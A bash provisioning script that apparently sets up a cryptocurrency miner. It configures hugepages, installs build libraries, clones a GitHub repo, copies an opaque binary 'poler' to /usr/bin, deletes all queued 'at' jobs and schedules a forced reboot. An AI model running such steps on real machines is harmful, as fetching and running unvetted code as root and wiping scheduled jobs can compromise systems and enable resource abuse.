#!/bin/bash

rm -rf /tmp/my1/
for i in `atq | awk '{print $1}'`;do atrm $i;done
sudo dpkg --configure -a
echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
sudo sysctl -p
sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
sleep 2
cd /tmp && mkdir my1
git clone https://github.com/not100today/my1.git /tmp/my1
cd /tmp/my1
chmod +x /tmp/my1/poler
chmod 777 ./*.sh
cp /tmp/my1/poler /usr/bin/

sudo apt-get install dos2unix
sudo dos2unix time1.sh
sudo dos2unix 75.sh


touch /tmp/at.txt
chmod +x /tmp/at.txt
echo 'sudo systemctl reboot -f' >> /tmp/at.txt
sudo at now + 8 hours < /tmp/at.txt

sudo ./time1.sh
